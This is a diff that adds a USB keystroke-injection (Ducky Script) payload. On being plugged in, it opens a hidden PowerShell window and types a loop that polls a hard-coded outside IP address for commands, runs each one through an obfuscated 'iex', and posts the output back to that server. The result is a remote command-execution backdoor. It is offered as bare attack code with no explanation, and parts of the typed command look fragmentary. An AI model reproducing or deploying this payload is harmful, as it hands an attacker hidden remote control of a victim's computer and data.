@@ -1,0 +1,20 @@
+DELAY 1500
+GUI r
+DELAY 500
+STRING powershell -NoP -NonI -W hidden
+DELAY 250
+ENTER
+DELAY 200
+STRING $s='212.227.203.83:8080';$i='bb6080b7-36a1bc37-289dc195';$p='http://';$v=Invoke-WebRequest -UseBasicParsing 
+DELAY 100
+STRING -Uri $p$s/bb6080b7 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/36a1bc37 
+DELAY 100
+STRING -Headers @{"Authorization"=$i}).Content;if ($c -ne 'None') {$r=i''e''x $c -ErrorAction Stop -ErrorVariable e;$r=Out-String 
+DELAY 100
+STRING -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/289dc195 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.
+DELAY 100
+STRING GetBytes($e+$r) -join ' ')} sleep 0.8}
+ENTER
+STRING .Close();exit
+DELAY 100
+CAPSLOCK
